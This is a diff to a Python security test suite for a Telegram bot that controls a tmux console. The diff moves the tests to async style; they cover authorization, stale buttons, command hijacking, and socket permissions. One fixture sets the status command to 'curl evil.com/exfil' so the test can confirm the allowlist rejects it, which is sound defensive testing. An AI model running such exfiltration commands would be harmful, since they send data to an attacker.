@@ -39,8 +39,8 @@ def make_dummy_config(allowed_user_id: int = 12345, status_command: str = None) 
     )
 
 
-class TestSecurityAudit(unittest.TestCase):
-    def test_unauthorized_callback_rejected(self):
+class TestSecurityAudit(unittest.IsolatedAsyncioTestCase):
+    async def test_unauthorized_callback_rejected(self):
         """Verify that a callback from an unauthorized user is rejected."""
         bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))
 
@@ -55,7 +55,7 @@ class TestSecurityAudit(unittest.TestCase):
         # Mock tmux_mirror
         bot.tmux_mirror.send_raw_key = AsyncMock()
 
-        asyncio.run(bot.handle_callback(mock_update, MagicMock()))
+        await bot.handle_callback(mock_update, MagicMock())
 
         # send_raw_key must NEVER have been called
         self.assertFalse(bot.tmux_mirror.send_raw_key.called, "Unauthorized users must not send keys to tmux!")
@@ -81,7 +81,7 @@ class TestSecurityAudit(unittest.TestCase):
         mock_update.effective_chat.type = "private"
         self.assertTrue(bot.is_authorized(mock_update))
 
-    def test_stale_turn_callback_invalidation(self):
+    async def test_stale_turn_callback_invalidation(self):
         """Verify that inline buttons from previous turns are invalidated."""
         bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))
 
@@ -105,7 +105,7 @@ class TestSecurityAudit(unittest.TestCase):
         mock_query.edit_message_text = AsyncMock()
         mock_update.callback_query = mock_query
 
-        asyncio.run(bot.handle_callback(mock_update, MagicMock()))
+        await bot.handle_callback(mock_update, MagicMock())
 
         # No key sent to tmux
         self.assertFalse(bot.tmux_mirror.send_raw_key.called, "Stale buttons from previous turns must not send keys!")
@@ -113,7 +113,7 @@ class TestSecurityAudit(unittest.TestCase):
         self.assertTrue(mock_query.edit_message_text.called)
         self.assertIn("expired", mock_query.edit_message_text.call_args[0][0])
 
-    def test_quick_action_no_substring_hijack(self):
+    async def test_quick_action_no_substring_hijack(self):
         """Verify that conversational sentences containing keywords do not trigger quick commands."""
         bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))
         bot.cmd_new = AsyncMock()
@@ -135,7 +135,7 @@ class TestSecurityAudit(unittest.TestCase):
         # Conversational message containing "New"
         mock_update.effective_message.text = "What is the New feature in Python 3.12?"
 
-        asyncio.run(bot.handle_message(mock_update, MagicMock()))
+        await bot.handle_message(mock_update, MagicMock())
 
         # Must not have called cmd_new!
         self.assertFalse(bot.cmd_new.called, "Conversational text containing 'New' must not trigger cmd_new!")
@@ -143,7 +143,7 @@ class TestSecurityAudit(unittest.TestCase):
         self.assertTrue(bot.tmux_mirror.send_input.called)
         self.assertEqual(bot.tmux_mirror.send_input.call_args[0][0], "What is the New feature in Python 3.12?")
 
-    def test_pending_prompt_blocks_free_text_input(self):
+    async def test_pending_prompt_blocks_free_text_input(self):
         """Verify that pending confirmation prompt prevents sending plain text to console."""
         bot = AgyTelegramBot(make_dummy_config(allowed_user_id=12345))
         bot.tmux_mirror.send_input = AsyncMock()
@@ -163,14 +163,14 @@ class TestSecurityAudit(unittest.TestCase):
         mock_update.effective_message.text = "ls -la"
         mock_update.effective_message.reply_text = AsyncMock()
 
-        asyncio.run(bot.handle_message(mock_update, MagicMock()))
+        await bot.handle_message(mock_update, MagicMock())
 
         # send_input must NOT have been called while prompt is active!
         self.assertFalse(bot.tmux_mirror.send_input.called)
         self.assertTrue(mock_update.effective_message.reply_text.called)
         self.assertIn("Pending Authorization Request", mock_update.effective_message.reply_text.call_args[0][0])
 
-    def test_cmd_status_allowlist_enforcement(self):
+    async def test_cmd_status_allowlist_enforcement(self):
         """Verify that cmd_status rejects binaries outside the allowlist."""
         # Config with unauthorized command
         config = make_dummy_config(allowed_user_id=12345, status_command="curl evil.com/exfil")
@@ -182,7 +182,7 @@ class TestSecurityAudit(unittest.TestCase):
         mock_update.effective_chat.type = "private"
         mock_update.effective_chat.send_action = AsyncMock()
 
-        asyncio.run(bot.cmd_status(mock_update, MagicMock()))
+        await bot.cmd_status(mock_update, MagicMock())
 
         # Must have rejected execution
         self.assertTrue(bot.reply_safe.called)
@@ -190,36 +190,35 @@ class TestSecurityAudit(unittest.TestCase):
         self.assertIn("Unauthorized status binary", reply_text)
         self.assertIn("curl", reply_text)
 
-    def test_sentinel_socket_permissions_and_creation(self):
+    async def test_sentinel_socket_permissions_and_creation(self):
         """Verify that the UNIX socket is created with 0o600 restrictive permissions."""
         with tempfile.TemporaryDirectory() as tmpdir:
             sock_path = os.path.join(tmpdir, "test-sentinel.sock")
             server = SentinelServer(socket_path=sock_path)
 
-            async def run_server():
-                await server.start()
+            await server.start()
+            try:
                 self.assertTrue(os.path.exists(sock_path))
                 # Verify file permissions
                 mode = os.stat(sock_path).st_mode & 0o777
                 self.assertEqual(mode, 0o600, "UNIX socket must have restrictive 0o600 permissions!")
+            finally:
                 await server.stop()
 
-            asyncio.run(run_server())
-
-    def test_sentinel_socket_occupied_refuses_to_steal(self):
+    async def test_sentinel_socket_occupied_refuses_to_steal(self):
         """Verify that starting SentinelServer raises an error if another instance is listening."""
         with tempfile.TemporaryDirectory() as tmpdir:
             sock_path = os.path.join(tmpdir, "test-sentinel-busy.sock")
             server1 = SentinelServer(socket_path=sock_path)
             server2 = SentinelServer(socket_path=sock_path)
 
-            async def run_test():
-                await server1.start()
+            await server1.start()
+            try:
                 with self.assertRaises(RuntimeError):
                     await server2.start()
+            finally:
                 await server1.stop()
 
-            asyncio.run(run_test())
 
     def test_split_text_balanced_html(self):
         """Verify that split_text balances pre/code tags across consecutive chunks."""
